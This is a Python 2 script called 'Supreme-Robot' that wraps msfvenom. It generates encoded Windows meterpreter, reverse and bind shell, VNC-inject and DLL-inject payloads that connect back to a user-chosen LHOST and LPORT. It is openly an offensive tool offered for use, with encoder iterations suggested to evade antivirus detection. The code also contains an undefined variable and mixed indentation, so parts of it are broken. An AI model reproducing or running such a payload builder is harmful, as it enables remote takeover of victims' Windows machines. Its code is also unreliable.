import sys, platform
from subprocess import call

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green					# Variables for text colors. Saves me the trouble thank you!
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


while (True):
    print C + "   _____                                      _____       _           _    "
    print "  / ____|                                    |  __ \     | |         | |   "
    print "  | (___  _   _ _ __  _ __ ___ _ __ ___   ___| |__) |___ | |__   ___ | |_  "
    print "  \___ \|| | | |  _ \| '__/ _ \ '_ ` _ \ / _ \  _  // _ \| '_ \ / _ \| __| "
    print "   ____) | |_| | |_) | | |  __/ | | | | |  __/ | \ \ (_) | |_) | (_) | |_  "
    print "  |_____/ \__,_| .__/|_|  \___|_| |_| |_|\___|_|  \_\___/|_.__/ \___/ \__| "
    print "               | |                                                         "
    print "               |_|                                                         " + W
    print G + "[*] Automatic Metasploit Payload Generator [*]" + P
    print "[*] Written By: ex0dus_0x [*]" + W
    print "     "
    print "You are currently using " + O + str(platform.system()) + " " + str(platform.release()) + W

    if str(platform.system()) != "Linux":
		print R + "You are not using Linux. It is the recommended operating system for this program. Some features may not work" + W
    else:
        print B + "Supreme-Robot v1 release" + W
        print "     "

    print GR + "What is the target operating system?" + W
    print "(1) Windows"
    opsys = raw_input("[>] ")
    print C + "Choose the payload to generate:" + P
    print "(1) windows/meterpreter/reverse_tcp"
    print "(2) windows/meterpreter/bind_tcp"
    print "(3) windows/meterpreter/reverse_http"
    print "(4) windows/meterpreter/reverse_https"
    print "    "
    print "(5) windows/shell/reverse_tcp"
    print "(6) windows/shell/bind_tcp"
    print "(7) windows/shell/reverse_http"
    print "(8) windows/shell/reverse_https"
    print "     "
    print "(9) windows/vncinject/reverse_tcp"
    print "(10) windows/vncinject/bind_tcp"
    print "(11) windows/vncinject/reverse_http"
    print "(12) windows/vncinject/reverse_https"
    print "     "
    print "(13) windows/dllinject/reverse_tcp"
    print "(14) windows/dllinject/bind_tcp"
    print "(15) windows/dllinject/reverse_http"
    print "(16) windows/dllinject/reverse_https" + W
    payop = raw_input("[>] ")
    print "Good..good. What is the " +  O + "LHOST?" + w
    lhost = raw_input("[>] ")
    print "What is the " + O + "LPORT?" + W
    lport = raw_input("[>] ")
    print "What is the encoder being used?" + O + " (typically x86/shikata_ga_nai)" + W
    encode = raw_input("[>] ")
    print "How many iterations should the encoder be used?"
    iteration = raw_input("[>] ")
    print B + "Almost done..." + W
    print "What is the format you the file to be in? " + W
    formatop = raw_input("[>] ")
    print "What would you like to name the payload?"
    payname = raw_input("[>] ")
    print O + "Creating payload..." + W

    if payop == "1":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "2":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/meterpreter/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "3":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/meterpreter/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "4":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/meterpreter/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "5":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/shell/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "6":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/shell/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "7":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/shell/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "8":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/shell/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "9":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/vncinject/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "10":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/vncinject/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "11":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/vncinject/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "12":
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/vncinject/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "13":
        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
        dllpath = raw_input("[>] ")
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/dllinject/reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "14":
        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
        dllpath = raw_input("[>] ")
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/dllinject/bind_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "15":
        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
        dllpath = raw_input("[>] ")
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/dllinject/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    elif payop == "16":
        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W 
        dllpath = raw_input("[>] ")
        with open("{}.{}".format(payname, formatop), 'w') as outfile:
            call(["msfvenom", "-p", "windows/dllinject/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
    else:
        redo = raw_input(R + "[>] Something went wrong. Care to start over? (y/n)" + W)
        if redo == "y":
            continue
        else:
            sys.exit()
